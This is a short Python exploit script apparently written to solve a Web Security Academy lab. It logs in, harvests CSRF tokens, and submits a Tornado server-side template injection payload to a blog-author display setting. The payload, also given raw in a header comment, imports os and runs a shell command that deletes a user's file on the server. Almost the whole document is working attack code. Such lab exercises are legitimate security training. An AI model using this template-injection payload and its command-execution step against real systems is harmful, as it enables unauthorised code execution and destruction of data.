'''
Tornado template 

{% import os %}{{os.system('rm /home/carlos/morale.txt')}}

'''

import requests
from bs4 import BeautifulSoup

url = "https://acbd1f4f1e57186fc014473c00c00051.web-security-academy.net"

def  get_csrf(text):
	soup = BeautifulSoup(text, "html.parser")
	for i in soup.find_all('input'):
		if i.get('name') == "csrf":
			csrf = i.get('value')
	return csrf

def slove(url):
	s = requests.session()

	r1 = s.get(url+"/login")
	c1 = get_csrf(r1.text)

	data = {"csrf": c1, "username": "wiener", "password" :"peter"}
	r2 = s.post(url+"/login", data=data)
	c2 = get_csrf(r2.text)

	payload = r"user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')"
	data2 = {"blog-post-author-display": payload , "csrf" : c2} 
	exploit = s.post(url + "/my-account/change-blog-post-author-display", data=data2 )

	print(exploit)

slove(url)